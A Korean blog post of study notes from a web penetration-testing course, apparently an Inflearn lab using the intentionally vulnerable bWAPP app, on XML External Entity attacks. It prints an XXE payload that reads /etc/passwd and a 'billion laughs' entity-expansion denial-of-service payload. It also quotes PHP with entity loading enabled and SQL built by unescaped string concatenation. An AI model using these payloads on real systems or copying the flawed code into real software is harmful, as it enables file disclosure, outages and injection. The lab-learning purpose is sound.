---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - XML 외부 엔티티 공격"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part7 A7
  - 기능 수준의 접근 통제 누락
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 22강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## XML 외부 엔티티 공격

* Input --> Process --> Output의 각 과정의 취약점을 이용

![image](https://user-images.githubusercontent.com/28076542/53409087-72644e80-3a03-11e9-811b-2c68fc438c0d.png)

## XML External Entity Attacks (XXE)

![image](https://user-images.githubusercontent.com/28076542/53409524-73e24680-3a04-11e9-9fdd-cc87b9670da7.png)

### 삽입할 XML 코드

```xml
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE root [
<!ENTITY bWAPP SYSTEM "file:///etc/passwd"> ]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>

##############################################################

<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT login (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]>
<reset><login>&lol9;</login><secret>blah</secret></reset>
```

### Any Bugs?를 누르고 BurpSuite Repeater 실행 후 XML 코드 삽입

```xml
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE root [
<!ENTITY bWAPP SYSTEM "file:///etc/passwd"> ]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

![image](https://user-images.githubusercontent.com/28076542/53410010-e9024b80-3a05-11e9-93e6-bfca75e5df4e.png)

```xml
<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT login (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]>
<reset><login>&lol9;</login><secret>blah</secret></reset>
```

![image](https://user-images.githubusercontent.com/28076542/53410067-14853600-3a06-11e9-977b-ec15901a5236.png)

* **서버 응답이 굉장히 오래 걸림**

### 서버 응답이 느린 이유

* lol1 ~ lol9까지 ENTITY를 생성하다가 마지막 `<reset><login>&lol9;</login><secret>blah</secret></reset>`에서 문제 발생
* 각 ENTITY에서 상위 lol을 호출하여서 DoS 공격을 발생시킴 --> $$10^9$$번 호출

---

### XXE-2.php에서 방어하는 부분

```php
	$login = $xml->login;
	$secret = $xml->secret;

    if($login && $login != "" && $secret)
    {

        // $login = mysqli_real_escape_string($link, $login);
        // $secret = mysqli_real_escape_string($link, $secret);
        
        $sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'";

        // Debugging
        // echo $sql;      

        $recordset = $link->query($sql);

        if(!$recordset)
        {

            die("Connect Error: " . $link->error);

        }

        $message = $login . "'s secret has been reset!";

    }
```

```php
else
{

    // Disables XML external entities. Doesn't work with older PHP versions!
    // libxml_disable_entity_loader(true);
    $xml = simplexml_load_string($body);
    
    // Debugging
    // print_r($xml);

    $login = $_SESSION["login"];
    $secret = $xml->secret;
```

> 세션이 그냥 로그인을 가지고 오고 있고 로그인을 가져오기 때문에 시크릿에 대입할 수 없어서 출력 값을 조정할 수 없다. 하지만 내부적으로 다른 동작을 할 수 있다. 따라서 완벽한 방어책은 아니다. 어쨋든 `$login = $xml->login;`에서 `$login = $_SESSION["login"];`으로 어느정도 방어는 한다. 아무튼 XSS처럼 XML 태그를 사용하지 못하게 할만큼 안전한 방법은 아니다.